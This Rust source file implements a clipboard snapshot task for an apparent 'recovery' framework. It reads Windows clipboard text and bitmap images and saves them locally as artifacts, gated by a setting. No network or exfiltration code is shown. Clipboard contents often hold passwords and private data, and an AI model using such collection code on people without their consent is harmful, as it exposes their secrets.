use crate::recovery::{
    context::RecoveryContext,
    output::{write_binary_artifact, write_text_artifact},
    settings::RecoveryControl,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::sync::Arc;
use tokio::task;
use tracing::{info, warn};

pub fn clipboard_task(_ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(ClipboardTask)
}

struct ClipboardTask;

#[async_trait]
impl RecoveryTask for ClipboardTask {
    fn label(&self) -> String {
        "Clipboard Snapshot".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        if !RecoveryControl::global().capture_clipboard() {
            return Ok(Vec::new());
        }

        let capture = task::spawn_blocking(capture_clipboard_content)
            .await
            .map_err(|err| RecoveryError::Custom(format!("clipboard capture interrupted: {err}")))?
            .map_err(|err| RecoveryError::Custom(format!("clipboard capture failed: {err}")))?;

        let mut artifacts = Vec::new();

        if let Some(text) = capture.text {
            info!("captured clipboard text");
            let artifact = write_text_artifact(
                ctx,
                self.category(),
                &self.label(),
                "clipboard-text.txt",
                &text,
            )
            .await?;
            artifacts.push(artifact);
        }

        if let Some(png) = capture.image {
            info!("captured clipboard image");
            let artifact = write_binary_artifact(
                ctx,
                self.category(),
                &self.label(),
                "clipboard-image.png",
                &png,
            )
            .await?;
            artifacts.push(artifact);
        }

        if artifacts.is_empty() {
            warn!("clipboard was empty or unsupported");
        }

        Ok(artifacts)
    }
}

struct ClipboardCapture {
    text: Option<String>,
    image: Option<Vec<u8>>,
}

fn capture_clipboard_content() -> Result<ClipboardCapture, String> {
    #[cfg(windows)]
    {
        use windows::Win32::Foundation::HWND;
        use windows::Win32::System::DataExchange::OpenClipboard;

        unsafe {
            OpenClipboard(HWND(0)).map_err(|err| format!("failed to open clipboard: {err}"))?;
        }
        let _guard = ClipboardGuard(true);

        let text = match capture_clipboard_text() {
            Ok(text) => text,
            Err(err) => {
                warn!(error = ?err, "clipboard text unavailable");
                None
            }
        };
        let image = match capture_clipboard_image() {
            Ok(image) => image,
            Err(err) => {
                warn!(error = ?err, "clipboard image unavailable");
                None
            }
        };

        Ok(ClipboardCapture { text, image })
    }
    #[cfg(not(windows))]
    {
        warn!("clipboard capture is not supported on this platform");
        Ok(ClipboardCapture {
            text: None,
            image: None,
        })
    }
}

#[cfg(windows)]
struct ClipboardGuard(bool);

#[cfg(windows)]
impl Drop for ClipboardGuard {
    fn drop(&mut self) {
        if self.0 {
            use windows::Win32::System::DataExchange::CloseClipboard;
            unsafe {
                let _ = CloseClipboard();
            }
            self.0 = false;
        }
    }
}

#[cfg(windows)]
fn capture_clipboard_text() -> Result<Option<String>, String> {
    use std::slice;
    use windows::Win32::Foundation::{HANDLE, HGLOBAL};
    use windows::Win32::System::DataExchange::{GetClipboardData, IsClipboardFormatAvailable};
    use windows::Win32::System::Memory::{GlobalLock, GlobalSize, GlobalUnlock};
    use windows::Win32::System::Ole::{CF_TEXT, CF_UNICODETEXT};

    if unsafe { IsClipboardFormatAvailable(CF_UNICODETEXT.0 as u32).is_ok() } {
        let handle: HANDLE = unsafe { GetClipboardData(CF_UNICODETEXT.0 as u32) }
            .map_err(|err| format!("failed to get unicode clipboard text: {err}"))?;
        if handle.0 == 0 {
            return Ok(None);
        }
        let hglobal = HGLOBAL(handle.0 as *mut _);
        let ptr = unsafe { GlobalLock(hglobal) };
        if ptr.is_null() {
            return Err("failed to lock clipboard text".to_string());
        }
        let size = unsafe { GlobalSize(hglobal) };
        let len = (size / 2).saturating_sub(1);
        let slice = unsafe { slice::from_raw_parts(ptr as *const u16, len as usize) };
        let text = String::from_utf16_lossy(slice);
        unsafe {
            let _ = GlobalUnlock(hglobal);
        }
        let trimmed = text.trim_end_matches('\u{0}').to_string();
        if trimmed.is_empty() {
            return Ok(None);
        }
        return Ok(Some(trimmed));
    }

    if unsafe { IsClipboardFormatAvailable(CF_TEXT.0 as u32).is_ok() } {
        let handle: HANDLE = unsafe { GetClipboardData(CF_TEXT.0 as u32) }
            .map_err(|err| format!("failed to get ansi clipboard text: {err}"))?;
        if handle.0 == 0 {
            return Ok(None);
        }
        let hglobal = HGLOBAL(handle.0 as *mut _);
        let ptr = unsafe { GlobalLock(hglobal) };
        if ptr.is_null() {
            return Err("failed to lock clipboard text".to_string());
        }
        let size = unsafe { GlobalSize(hglobal) };
        let slice = unsafe { slice::from_raw_parts(ptr as *const u8, size as usize) };
        let text = String::from_utf8_lossy(slice).to_string();
        unsafe {
            let _ = GlobalUnlock(hglobal);
        }
        let trimmed = text.trim_end_matches(char::from(0)).to_string();
        if trimmed.is_empty() {
            return Ok(None);
        }
        return Ok(Some(trimmed));
    }

    Ok(None)
}

#[cfg(windows)]
fn capture_clipboard_image() -> Result<Option<Vec<u8>>, String> {
    use windows::Win32::Foundation::HWND;
    use windows::Win32::Graphics::Gdi::{
        BITMAP, BITMAPINFO, BITMAPINFOHEADER, CreateCompatibleDC, DIB_RGB_COLORS, DeleteDC, GetDC,
        GetDIBits, GetObjectW, HBITMAP, HGDIOBJ, RGBQUAD, ReleaseDC, SelectObject,
    };
    use windows::Win32::System::DataExchange::{GetClipboardData, IsClipboardFormatAvailable};
    use windows::Win32::System::Ole::CF_BITMAP;
    if unsafe { !IsClipboardFormatAvailable(CF_BITMAP.0 as u32).is_ok() } {
        return Ok(None);
    }

    let hbitmap_handle = unsafe { GetClipboardData(CF_BITMAP.0 as u32) }
        .map_err(|err| format!("failed to get clipboard bitmap: {err}"))?;
    if hbitmap_handle.0 == 0 {
        return Ok(None);
    }

    let hbitmap = HBITMAP(hbitmap_handle.0);

    let mut bitmap = BITMAP::default();
    let obtained = unsafe {
        GetObjectW(
            HGDIOBJ(hbitmap.0),
            std::mem::size_of::<BITMAP>() as i32,
            Some(&mut bitmap as *mut _ as *mut _),
        )
    };
    if obtained == 0 {
        return Err("GetObjectW failed".to_string());
    }

    let width = bitmap.bmWidth;
    let height = bitmap.bmHeight.abs();
    if width <= 0 || height == 0 {
        return Err("clipboard bitmap has invalid dimensions".to_string());
    }

    unsafe {
        let screen_dc = GetDC(HWND(0));
        if screen_dc.0 == 0 {
            return Err("failed to acquire screen DC".to_string());
        }
        let mem_dc = CreateCompatibleDC(screen_dc);
        if mem_dc.0 == 0 {
            ReleaseDC(HWND(0), screen_dc);
            return Err("failed to create compatible DC".to_string());
        }

        let old = SelectObject(mem_dc, HGDIOBJ(hbitmap.0));
        if old.0 == 0 {
            DeleteDC(mem_dc);
            ReleaseDC(HWND(0), screen_dc);
            return Err("failed to select bitmap into DC".to_string());
        }

        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: -(height),
                biPlanes: 1,
                biBitCount: 32,
                biCompression: windows::Win32::Graphics::Gdi::BI_RGB.0,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [RGBQUAD::default(); 1],
        };

        let buffer_len = (width as u32 * height as u32 * 4) as usize;
        let mut bgra = vec![0u8; buffer_len];
        let scanlines = GetDIBits(
            mem_dc,
            HBITMAP(hbitmap.0),
            0,
            height as u32,
            Some(bgra.as_mut_ptr() as *mut _),
            &mut bmi,
            DIB_RGB_COLORS,
        );

        SelectObject(mem_dc, old);
        DeleteDC(mem_dc);
        ReleaseDC(HWND(0), screen_dc);

        if scanlines == 0 {
            return Err("GetDIBits failed for clipboard bitmap".to_string());
        }

        let rgba = bgra_to_rgba(&bgra);
        let png_bytes = encode_png(width as u32, height as u32, &rgba)?;
        Ok(Some(png_bytes))
    }
}

#[cfg(windows)]
fn bgra_to_rgba(bgra: &[u8]) -> Vec<u8> {
    let mut rgba = Vec::with_capacity(bgra.len());
    for chunk in bgra.chunks_exact(4) {
        rgba.push(chunk[2]);
        rgba.push(chunk[1]);
        rgba.push(chunk[0]);
        rgba.push(chunk[3]);
    }
    rgba
}

#[cfg(windows)]
fn encode_png(width: u32, height: u32, rgba: &[u8]) -> Result<Vec<u8>, String> {
    use image::{ColorType, ImageEncoder, codecs::png::PngEncoder};
    let mut bytes = Vec::new();
    let encoder = PngEncoder::new(&mut bytes);
    encoder
        .write_image(rgba, width, height, ColorType::Rgba8.into())
        .map_err(|err| format!("clipboard png encoding failed: {err}"))?;
    Ok(bytes)
}
